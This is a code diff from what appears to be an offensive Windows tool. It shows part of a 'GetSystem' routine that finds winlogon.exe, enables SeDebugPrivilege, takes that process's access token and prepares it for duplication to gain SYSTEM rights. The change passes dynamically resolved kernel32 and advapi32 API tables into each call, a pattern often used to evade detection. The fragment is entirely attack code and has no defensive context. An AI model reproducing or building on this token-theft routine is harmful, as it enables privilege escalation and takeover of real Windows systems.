@@ -58,17 +58,17 @@ int GetSystem(Kernel32_API kernel32,Advapi32_API advapi32) {
 
 	if (GetTargetHost(advapi32, &argurments, ProcessToRun)) {
 		WCHAR* TargetProcess = L"winlogon.exe";
-		DWORD pid = GetTargetProcessPID(TargetProcess);
+		DWORD pid = GetTargetProcessPID(kernel32,TargetProcess);
 
 		if (pid == 0){
 			printMsg(STATUS_ERROR, LEVEL_DEFAULT, "Fail to find process %ws", TargetProcess);
 			return FALSE;
 		}
-		if (!EnableWindowsPrivilege(SE_DEBUG_NAME_L)){
+		if (!EnableWindowsPrivilege(advapi32,SE_DEBUG_NAME_L)){
 			printMsg(STATUS_ERROR, LEVEL_DEFAULT, "Could not enable SeDebugPrivilege");
 			return FALSE;
 		}
-		if (!CheckWindowsPrivilege(SE_DEBUG_NAME_L)){
+		if (!CheckWindowsPrivilege(kernel32, advapi32,SE_DEBUG_NAME_L)){
 			printMsg(STATUS_OK, LEVEL_DEFAULT, "I do not have SeDebugPrivilege!\n");
 			return FALSE;
 		}
@@ -76,7 +76,7 @@ int GetSystem(Kernel32_API kernel32,Advapi32_API advapi32) {
 		//printMsg(STATUS_OK, LEVEL_DEFAULT, "Pid Chosen: %d\n", pid);
 
 		// Retrieves the remote process token.
-		HANDLE pToken = GetAccessToken(pid);
+		HANDLE pToken = GetAccessToken(kernel32, advapi32,pid);
 
 		//These are required to call DuplicateTokenEx.
 		SECURITY_IMPERSONATION_LEVEL seImpersonateLevel = SecurityImpersonation;
